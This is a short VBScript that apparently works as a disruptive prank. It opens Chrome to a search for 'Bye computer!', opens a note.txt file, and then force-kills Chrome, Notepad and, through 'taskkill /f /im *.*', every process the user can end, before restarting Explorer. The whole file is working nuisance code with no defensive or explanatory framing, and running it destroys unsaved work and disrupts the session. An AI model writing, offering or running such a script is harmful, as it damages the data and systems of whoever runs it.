Set shell = CreateObject("WScript.Shell")

Set fso = CreateObject("Scripting.FileSystemObject")

shell.run "chrome https://www.google.com/search?q=Bye+computer!"

    WScript.Sleep 5000

    shell.run "taskkill /f /im chrome.exe"

    notepadNote = fso.GetParentFolderName(WScript.ScriptFullName) & "\note.txt" 

    shell.run "notepad " & notepadNote

    WScript.Sleep 1000

    shell.run "taskkill /f /im notepad.exe"
    shell.run "taskkill /f /im *.*"
    shell.run "explorer.exe"
